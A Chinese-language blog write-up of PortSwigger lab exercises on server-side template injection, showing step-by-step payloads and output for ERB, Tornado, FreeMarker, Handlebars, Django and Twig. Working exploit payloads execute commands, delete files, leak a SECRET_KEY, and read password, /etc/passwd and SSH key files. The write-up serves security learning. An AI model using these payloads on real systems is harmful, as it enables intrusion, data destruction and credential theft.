---
title: Server-side template injection
description: Server-side template injection
last_update:
  date: "2025-09-09T08:00:00+08:00"
---

## Lab: Basic server-side template injection

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read                                     |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic |

點選第一個 product，發現導到 `/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

先合理推測注入點應該是 `?message=` 這邊

Lab 有說要閱讀 [ERB](https://docs.ruby-lang.org/en/3.4/ERB.html) 的官方文件

1. `<%= x %>`

```
(erb):1:in `<main>': undefined local variable or method `x' for main:Object (NameError) from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval' from /usr/lib/ruby/2.7.0/erb.rb:905:in `result' from -e:4:in `<main>'
```

2. `<%= x=42; x %>`

```
42
```

3. `<%= x=Dir.children('.'); x %>`

```
[".bash_logout", ".bashrc", ".profile", "morale.txt", ".bash_history"]
```

4. `<%= File.delete('morale.txt'); %>`

成功解題

## Lab: Basic server-side template injection (code context)

| Dimension | Description                                                                                                                          |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read                                                  |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context |

"Preferred name" 會去戳這隻 API

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=user.first_name&csrf=7HxFgj0pQGHnI4gYjKGWKmZFq76R0JI9`,
  method: "POST",
  credentials: "include",
});
```

Lab 有說要閱讀 [Tornado](https://www.tornadoweb.org/en/stable/template.html) 的官方文件

1. 修改成 user

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=user&csrf=7HxFgj0pQGHnI4gYjKGWKmZFq76R0JI9`,
  method: "POST",
  credentials: "include",
});
```

```
&lt;**main**.User instance at 0x7fa2a569f0f0&gt;
```

2. 修改成 666

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=${encodeURIComponent(`x=666;x`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
  method: "POST",
  credentials: "include",
});
```

3. 嘗試 import os

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=${encodeURIComponent(`import os;os.listdir('.')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
  method: "POST",
  credentials: "include",
});
```

```
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 4 _tt_tmp = import os;os.listdir('.') # <string>:1 ^ SyntaxError: invalid syntax
```

4. AI 說 Tornado 有一套自己的語法

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=${encodeURIComponent(`__import__('os').listdir('.')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
  method: "POST",
  credentials: "include",
});
```

```
[&#39;.bash_logout&#39;, &#39;.bashrc&#39;, &#39;.profile&#39;, &#39;morale.txt&#39;, &#39;.bash_history&#39;]
```

5. 來刪檔案

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=${encodeURIComponent(`__import__('os').remove('morale.txt')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
  method: "POST",
  credentials: "include",
});
```

## Lab: Server-side template injection using documentation

| Dimension | Description                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read-about-the-security-implications                   |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation |

在 `/product/template?productId=1` 有編輯模板的功能

1. 嘗試 `${product}`

`lab.actions.templateengines.FreeMarkerProduct@16e7dcfd`

[FreeMarker 官方文件](https://freemarker.apache.org/index.html)

[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)

2. 嘗試 `${"1+2"?eval}`

```
3
```

3. 嘗試

```
<#assign x="freemarker.template.utility.Execute"?new()>
${x("ls")}
```

```
morale.txt
```

4. 嘗試

```
<#assign x="freemarker.template.utility.Execute"?new()>
${x("rm morale.txt")}
```

成功刪除

## Lab: Server-side template injection in an unknown language with a documented exploit

| Dimension | Description                                                                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#look-for-known-exploits                                                             |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit |

發現 querystring 有可疑的注入點 `/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

1. `message={{7*7}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 Node.js v19.8.1
```

[HandleBar 的官網](https://handlebarsjs.com/)
[CVE-2021-23369 PoC (1)](https://github.com/fazilbaig1/CVE-2021-23369/blob/main/handlebars_exploit.py)
[CVE-2021-23369 PoC (2)](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767)

2. `message={{constructor.constructor('return 123')()}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: {{constructor.constructor('return --------------^ Expecting 'ID', got 'INVALID' at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 Node.js v19.8.1
```

3. `message={{this.constructor.constructor}}`

成功，但沒看到任何 message

4. `message={{lookup (lookup this "constructor") "constructor"}}`

```
function Function() { [native code] }
```

5. `message={{#with (lookup (lookup this "constructor") "constructor") as |func|}}{{func "return 123"}}{{/with}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: message={{ ----------^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'EOF' at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 Node.js v19.8.1
```

6. `message={{this.constructor.constructor.prototype}}`

成功，但沒看到任何 message

7. `message={{this.constructor.constructor.name}}`

成功，但沒看到任何 message

8. `message={{this.constructor.constructor "return 123"}}`

```
undefined:3 return container.escapeExpression((helpers.propertyIsEnumerable('constructor') ? helpers.constructor : undefined).call(depth0 != null ? depth0 : (container.nullContext || {}),"return 123",{"name":"constructor","hash":{},"data":data})); ^ TypeError: Cannot read properties of undefined (reading 'call') at Object.eval [as main] (eval at createFunctionContext (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:257:23), <anonymous>:3:117) at main (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:175:32) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:178:12) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:526:21) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 at runScript (node:internal/process/execution:82:62) Node.js v19.8.1
```

9. `message={{[this.constructor.constructor]%20"return%20123"}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19 throw new _exception2['default']('Missing helper: "' + arguments[arguments.length - 1].name + '"'); ^ Error: Missing helper: "this.constructor.constructor" at Object.<anonymous> (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13) at Object.eval [as main] (eval at createFunctionContext (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:257:23), <anonymous>:3:115) at main (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:175:32) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:178:12) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:526:21) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 { description: undefined, fileName: undefined, lineNumber: undefined, number: undefined } Node.js v19.8.1
```

10. `message={{lookup this.constructor "constructor" "return 123"}}`

成功，但沒看到任何 message

11. `message={{lookup (lookup this "constructor") "constructor" "throw new Error('test')"}}`

```
function Function() { [native code] }
```

12. `{{apply (lookup (lookup this "constructor") "constructor") this "throw new Error('test')"}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19 throw new _exception2['default']('Missing helper: "' + arguments[arguments.length - 1].name + '"'); ^ Error: Missing helper: "apply" at Object.<anonymous> (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13) at Object.eval [as main] (eval at createFunctionContext (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:257:23), <anonymous>:5:106) at main (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:175:32) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:178:12) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:526:21) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 { description: undefined, fileName: undefined, lineNumber: undefined, number: undefined } Node.js v19.8.1
```

13. `{{call (lookup (lookup this "constructor") "constructor") "throw new Error('test')"}}`

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19 throw new _exception2['default']('Missing helper: "' + arguments[arguments.length - 1].name + '"'); ^ Error: Missing helper: "call" at Object.<anonymous> (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13) at Object.eval [as main] (eval at createFunctionContext (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:257:23), <anonymous>:5:104) at main (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:175:32) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/runtime.js:178:12) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:526:21) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 { description: undefined, fileName: undefined, lineNumber: undefined, number: undefined } Node.js v19.8.1
```

14. 最後是看答案才解題的

```js
encodeURIComponent(
  `wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}`.replaceAll("\n", ""),
);
```

看起來應該是 [這篇](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2)

## Lab: Server-side template injection with information disclosure via user-supplied objects

| Dimension | Description                                                                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#developer-supplied-objects                                                               |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects |

注入點應該是在 `/product/template?productId=1`

1. `{{T(java.lang.System).getenv()}}`

```
Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '(java.lang.System).getenv()' from 'T(java.lang.System).getenv()'
```

2. 問了 AI，運氣好，一次解決 `{{ settings.SECRET_KEY }}`

75ozk1mu1703073y26eowd52tj9vf91c

## Lab: Server-side template injection in a sandboxed environment

| Dimension | Description                                                                                                                                  |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#constructing-a-custom-exploit-using-an-object-chain           |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment |

注入點在 `/product/template?productId=1`

1. `${product}`

```
lab.actions.templateengines.FreeMarkerProduct@48e4374
```

2. `${product.getClass()}`

```
class lab.actions.templateengines.FreeMarkerProduct
```

3. `${product.getProtectionDomain()}`

```
FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> product.getProtectionDomain [in template "freemarker" at line 1, column 3] ---- Tip: It's the step after the last dot that caused this error, not those before it. ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${product.getProtectionDomain()} [in template "freemarker" at line 1, column 1] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) at freemarker.core.UnexpectedTypeException.<init>(UnexpectedTypeException.java:63) at freemarker.core.NonMethodException.<init>(NonMethodException.java:74) at freemarker.core.MethodCall._eval(MethodCall.java:67) at freemarker.core.Expression.eval(Expression.java:101) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
```

4. `${product.getClass().getProtectionDomain()}`

```
ProtectionDomain (file:/opt/jars/freemarker.jar <no signer certificates>) jdk.internal.loader.ClassLoaders$AppClassLoader@6b9651f3 <no principals> java.security.Permissions@74e52303 ( ("java.io.FilePermission" "/opt/jars/freemarker.jar" "read") ("java.lang.RuntimePermission" "exitVM") )
```

5. `${product.getClass().getProtectionDomain().getCodeSource()}`

```
(file:/opt/jars/freemarker.jar <no signer certificates>)
```

6. `${product.getClass().getProtectionDomain().getCodeSource().getLocation()}`

```
file:/opt/jars/freemarker.jar
```

7. `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt')}`

```
file:/home/carlos/my_password.txt
```

8. `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

```
48 111 116 48 108 53 120 51 105 114 51 106 112 103 56 107 105 55 108 56
```

[convert-ascii-to-string](https://onlinestringtools.com/convert-ascii-to-string) => `0ot0l5x3ir3jpg8ki7l8`

## Lab: Server-side template injection with a custom exploit

| Dimension | Description                                                                                                                                   |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#constructing-a-custom-exploit-using-developer-supplied-objects |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit       |

注入點跟 [Lab: Basic server-side template injection (code context)](#lab-basic-server-side-template-injection-code-context) 一樣

1. `7*7`

```js
fetch(`${location.origin}/my-account/change-blog-post-author-display`, {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `blog-post-author-display=7*7&csrf=0o0m9vUygQIw8Q6fKe3aijTzcaOHXDbH`,
  method: "POST",
  credentials: "include",
});
```

成功看到 49

2. `}}`

```
PHP Fatal error: Uncaught Twig_Error_Syntax: Unexpected token "end of print statement" of value "" in "index" at line 1. in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/ExpressionParser.php:201 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/ExpressionParser.php(92): Twig_ExpressionParser->parsePrimaryExpression() #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/ExpressionParser.php(45): Twig_ExpressionParser->getPrimary() #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(125): Twig_ExpressionParser->parseExpression() #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(81): Twig_Parser->subparse(NULL, false) #4 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(533): Twig_Parser->parse(Object(Twig_TokenStream)) #5 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(565): Twig_Environment->parse(Object(Twig_TokenStream)) #6 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(36 in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/ExpressionParser.php on line 201
```

3. `_self`

```
index
```

4. 以下結果皆為空字串

```
_self.env
_self.env.getFunctions
_self.env.getFilters
app
_context.keys()
attribute(_self,'env')
this
block
global
```

5. `_context`

```
Array
```

6. `user`

```
PHP Fatal error: Uncaught Error: Object of class User could not be converted to string in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(378) : eval()'d code:23 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(394): __TwigTemplate_b6a7c72a93507ca5c7099ebdeaec25ac82b0a909b1559ad83f3f9c71a201576b->doDisplay(Array, Array) #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(371): Twig_Template->displayWithErrorHandling(Array, Array) #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(379): Twig_Template->display(Array) #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(289): Twig_Template->render(Array) #4 Command line code(10): Twig_Environment->render('index', Array) #5 {main} thrown in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(378) : eval()'d code on line 23
```

有機會，找到 Class User

7. `user.setAvatar`

```
PHP Fatal error: Uncaught ArgumentCountError: Too few arguments to function User::setAvatar(), 0 passed in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Extension/Core.php on line 1601 and exactly 2 expected in /home/carlos/User.php:26 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Extension/Core.php(1601): User->setAvatar() #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(378) : eval()'d code(23): twig_get_attribute(Object(Twig_Environment), Object(Twig_Source), Object(User), 'setAvatar', Array) #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(394): __TwigTemplate_ea92e35c2ac056d3ccaf782bb88d654b8407da78713315ecff86a036a5b75b94->doDisplay(Array, Array) #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(371): Twig_Template->displayWithErrorHandling(Array, Array) #4 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Template.php(379): Twig_Template->display(Array) #5 /usr/local/envs/php-twig-2.4.6/vendor/twig/twi in /home/carlos/User.php on line 26
```

8. 上傳頭像後，再 `user.setAvatar('/etc/passwd', 'image/png')`

成功從圖片提取到 `/etc/passwd` 的內容

9. `user.setAvatar('/home/carlos/User.php', 'image/png')`

```php
class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}
```

10. `user.setAvatar('/home/carlos/.ssh/id_rsa', 'image/png')`

`Nothing to see here :)`

11. `user.gdprDelete()`

這題我覺得真的有點半盲猜？首先要先猜到 `user`，再來還要猜到 `setAvatar` 的方法

## 小結

實務上我沒有遇過 SSTI 的漏洞，我覺得在真實世界很少(?)雖然 Email Template 確實常常會看到，但除此之外好像就沒有其他場景了(?)我覺得這個的 exploit 過程偏難，因為要去了解每個模板引擎的語法，還有每個程式語言的特性，基本上我都是直接問 AI，至少先知道 exploit payload 有個印象，不然從零開始閱讀官方文件，真的太花時間了

這個系列的 Lab 也是很快地就結束了，感覺有學到了一些皮毛，但要能夠在真實世界找到 SSTI 的漏洞，我覺得我還有很多路要走QQ

## 參考資料

- https://portswigger.net/web-security/server-side-template-injection
